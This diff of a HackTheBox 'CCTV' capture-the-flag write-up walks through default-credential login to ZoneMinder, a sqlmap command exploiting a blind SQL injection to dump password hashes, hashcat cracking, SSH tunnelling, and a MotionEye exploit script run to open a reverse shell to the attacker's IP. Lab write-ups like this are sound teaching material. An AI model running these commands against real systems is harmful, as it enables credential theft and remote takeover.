@@ -9,7 +9,8 @@ image: /assets/CCTV/CCTV.png
 
 On today's hacking i've been working on a machine called CCTV, it's an "easy" not so "easy" Linux machine from HackTheBox. This is an active machine so the paper i'm about to write will be published once the machine is retired so it doesn't affect the current season of HackTheBox.
 
-![[CCTV.png]]
+![CCTV](/assets/CCTV/CCTV.png)
+
 
 Us usual, I've started with the meta of all CTF's which is start with enumeration, specifically with nmap. I rann the following command and also, recently I've learned that it's a good behavior to export all the results into a file, this way come back to those results and compare them.
 
@@ -21,7 +22,7 @@ Us usual, I've started with the meta of all CTF's which is start with enumeratio
 ``-sS --> Stealth Scan, faster and silent
 ``-oN --> export
 
-![[cctvnmap1.png]]
+![CCTV](/assets/CCTV/cctvnmap1.png)
 
 After the first result, port 22 and 80, I ran the second nmap command to get more information about the services and it's versions.
 
@@ -30,38 +31,38 @@ After the first result, port 22 and 80, I ran the second nmap command to get mor
 ``-sCV --> nmap scripts to get the information
 ``-oN --> export
 
-![[cctvnmap2.png]]
+![CCTV](/assets/CCTV/cctvnmap2.png)
 
 After the nmap's, I went straight to the web to see what else I can discover here. I modified the file ``/etc/hosts`` and added the IP with the name  to make things easier and jumped directly into the web.
 
-![[cctvweb.png]]
+![CCTV](/assets/CCTV/cctvweb.png)
 
 Seems to be a monitoring web to control cameras or offer a service related to surveillance. Clicking here and there and checking the source, ``robots.txt``, and other areas found the "Staff login" button that redirects to another directory -->
 
-![[staffloginbutton.png]]
+![CCTV](/assets/CCTV/staffloginbutton.png)
 
-![[cctvzm.png]]
+![CCTV](/assets/CCTV/cctvzm.png)
 
 Tried to access to ``http://cctv.htb/zm`` and found a login page related to ZoneMinder. While looking for more information about ZoneMinder on the Internet I found that it has several vulnerabilities related to SQL Injections, time based and blind.  But that's not really useful to me because to abuse those vulnerabilities I need to be at least loged in, and check the version i'm facing to see if it's really vulnerable.
 
 Found nothing about bypassing the login screen so I went straight to the most common thing which is check default credentials --> admin:admin. A classic.
 
-![[zoneminderlogin.png]]
+![CCTV](/assets/CCTV/zoneminderlogin.png)
 
 Voilà we're in.
 Moved arround the interface to see what I can do, and, eventho i'm loged as admin, I don't have anything to check, there is no cameras, no events, just a few logs but nothing interesting. 
 I found in the options screen that there are 3 users in total, and the user I got, admin, has the same rights as user mark, the highest tier user is superadmin.
 
-![[userszm.png]]
+![CCTV](/assets/CCTV/userszm.png)
 
 After that, I went to ``feroxbuster`` to see if any other path escaped my sight but, I got nothing from it. 
 
-![[cctvferoxbuster.png]]
+![CCTV](/assets/CCTV/cctvferoxbuster.png)
 
 
 Verified that I'm on a version that is vulnerable to CVE-2024-51482 blind sql injection.
 
-![[zmversion.png]]
+![CCTV](/assets/CCTV/zmversion.png)
 
 CVE-2024-51482 is a critical boolean-based SQL Injection vulnerability discovered in ZoneMinder
 This flaw affects versions 1.37.* through 1.37.64 and allows authenticated attackers with low privileges to execute arbitrary SQL commands on the underlying database server.
@@ -79,10 +80,10 @@ This flaw affects versions 1.37.* through 1.37.64 and allows authenticated attac
 The vulnerability exists in the ``web/ajax/event.php`` file within the ``removetag`` function, but, as I said above, the interface is empty, there is no cameras and no events to check nor remove so I created a false camera, to generate a false event. This way I can create the perfect scenario to abuse the vulnerability
 Added the minimal details to make it "work"
 
-![[zoneminderfalsecamara.png]]
+![CCTV](/assets/CCTV/zoneminderfalsecamara.png)
 
 
-![[falsecamera.png]]
+![CCTV](/assets/CCTV/falsecamera.png)
 
 With the false camera created, I captured the packet that is sent when trying to access to the events section  with BurpSuite to see if i can add here the ``removetag`` thingy.
 To my surprise theres a really big query with a lot of things added here, but I just need the 1 simple request with the ``removetag`` function in it so I reduced from this -->
@@ -95,16 +96,16 @@ To my surprise theres a really big query with a lot of things added here, but I 
 
 To this -->
 
-![[burpeventcatch3.png]]
+![CCTV](/assets/CCTV/burpeventcatch3.png)
 
 And it works, page returns code 200 so we are ready to go
 
-![[burpeventcatch2.png]]
+![CCTV](/assets/CCTV/burpeventcatch2.png)
 
 I'm gonna be honest here. I spent some time here in BurpSuite trying to create the query and avoid using sqlmap but that didn't work for me so, I decided to grab everything I need to run sqlmap properly and went to it.
 Grabbed the ZMSESSID cookie, verified the default databases for ZoneMinder and ran the following command
 
-![[zmcookie.png]]
+![CCTV](/assets/CCTV/zmcookie.png)
 
 ``sqlmap -u 'http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1&id=1' --cookie="ZMSESSID=oe645nieb6fh3lhk0ierjn217p" --data="tid=1&id=1" -p tid --dbms=mysql --technique=T --ignore-code=500 --batch -D zm -T Users -C Username,Password --dump ``
 
@@ -122,12 +123,12 @@ Grabbed the ZMSESSID cookie, verified the default databases for ZoneMinder and r
 
 
 
-![[sqlmap.png]]
+![CCTV](/assets/CCTV/sqlmap.png)
 
 Gotcha. Got the Usernames and Hashed passwords from all users. The user:password from admin we already know it (admin:admin).
 Judging by the aspect of these hashes seem to be bcrypt. Bcrypt hashes tend to be slow to crack, I hope it's not the case here
 
-![[sqlmap2.png]]
+![CCTV](/assets/CCTV/sqlmap2.png)
 
 ```
 superadmin:$2y$10$cmytVWFRnt1XfqsItsJRVe/ApxWxcIFQcURnm5N.rhlULwM0jrtbm
@@ -137,13 +138,13 @@ admin:$2y$10$t5z8uIT.n9uCdHCNidcLf.39T1Ui9nrlCkdXrzJMnJgkTiAvRUM6m
 
 Moved the hashes into a text and ran the following ``hashcat`` command -->
 
-![[hashestxt.png]]
+![CCTV](/assets/CCTV/hashestxt.png)
 
 ``hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt``
 ``-m 3200 --> bcrypt type
 ``/usr/share/wordlists/rockyou.txt --> wordlist
 
-![[tch4vi.github/Writeups/CCTV/Images/hashcat.png]]
+![CCTV](/assets/CCTV/hashcat.png)
 
 It took a bit but it discovered the hash from ``mark`` user, for the superadmin one ``hashcat`` is specifying that it will take at least 24 hours to test everything from the rockyou file. And hell no, i'm not waiting that long to be honest unless it's strictly needed.
 
@@ -153,60 +154,60 @@ mark user -->
 
 Connected to ``cctv.htb`` via ssh with ``mark`` credentials. With that we should be able to get the user flag and privesc.
 
-![[usershome.png]]
+![CCTV](/assets/CCTV/usershome.png)
 
 To my surprise, we are not able to get the user flag? Seems to be in another user ``sa_mark``
 And the current directory from ``mark`` is completely empty, there is nothing to take information from, or I didn't see it
 
-![[lshome.png]]
+![CCTV](/assets/CCTV/lshome.png)
 
 Checked if I'm able to run anything with sudo, and nothing
 
-![[privesc1.png]]
+![CCTV](/assets/CCTV/privesc1.png)
 
 Tried to find any file with the suid bit set on it, and nothing. Found  `pkexec` but the version installed is not vulnerable. In other machines we could abuse the ``pkexec`` file.
 
 ``find / -perm -4000 2>/dev/null
 
-![[pkexec.png]]
+![CCTV](/assets/CCTV/pkexec.png)
 
 After trying to find any file with the suid bit, or check if i'm able to run sudo with no results. A good choice to do privesc it's check the local services running. For that I ran the following command -->
 
 ``ss -tlnp``
 
-![[privesc2.png]]
+![CCTV](/assets/CCTV/privesc2.png)
 
 Found gold here. There is a lot of services running internally. I've verified every single one with ``curl`` but the only one that gave me something is the port ``8765``. I tunneled it with ``ssh`` to confirm what service is running
 
 ``ssh -L 8765:127.0.0.1:8765 mark@cctv.htb``
 
 
-![[tunneling.png]]
+![CCTV](/assets/CCTV/tunneling.png)
 
 Opened it with the browser ``localhost:8765``. boom.
 Another surveillance service MotionEye.
 
 
-![[motioneyescreen.png]]
+![CCTV](/assets/CCTV/motioneyescreen.png)
 
 Here I tried with the default admin credentials with no luck. 
 If that doesn't work, the best option is run arround the config files and try to find anything relevant, users, passwords, hashes, salts anything that could lead to NOT spend 24 hours with ``hashcat`` and the ``superadmin`` bcrypted password
 
 Found a different hash on ``motion.conf`` file. It's a ``SHA1`` hash -->
 
-![[motionconf.png]]
+![CCTV](/assets/CCTV/motionconf.png)
 
 ``989c5a8ee87a0e9521ec81a79187d162109282f0``
 
 Tried again with hashcat and eventho SHA1 shouldn't be as slow as bcrypt, I didn't had luck with the rockyou file and hashcat. Exhausted
 
-![[hashcat2.png]]
+![CCTV](/assets/CCTV/hashcat2.png)
 
-![[hashcat3.png]]
+![CCTV](/assets/CCTV/hashcat3.png)
 
 On the ``motion.conf`` file there is specified the ``admin_username``, the ``admin_password``, and the ``normal_username`` which is ``user``, and the ``normal_password`` is empty. Apparently looks like I can log in with user and no password
 
-![[userlogin.png]]
+![CCTV](/assets/CCTV/userlogin.png)
 
 But there is nothing much I can do with the normal user. I can take some pics of the current camera (is full black) and nothing more. 
 I searched information about Motioneye and the vulnerabilities that could have and there is one related to a RCE (CVE-2025-60787) that is pretty interesting because, it allows the attacker to get a reverse shell and with that I could grab the flag I want. At this point I'm not sure if i'm doing privesc. Seems more like lateral movement because, we jumped from ZoneMinder to MotionEye
@@ -222,11 +223,11 @@ The provided python script for the CVE-2025-60787 works smothly with the hashed 
 
 ``python3 CVE-2025-60787.py revshell --url 'http://127.0.0.1:8765' --user 'admin' --password '989c5a8ee87a0e9521ec81a79187d162109282f0' -i 10.10.14.228 --port 4444``
 
-![[cve202560787-2.png]]
+![CCTV](/assets/CCTV/cve202560787-2.png)
 
 Start listening port 4444 -->
 
-![[nclvnp2.png]]
+![CCTV](/assets/CCTV/nclvnp2.png)
 
 And it worked perfectly. I'm in with root privileges. I can run straight to all the flags and complete the machine
 
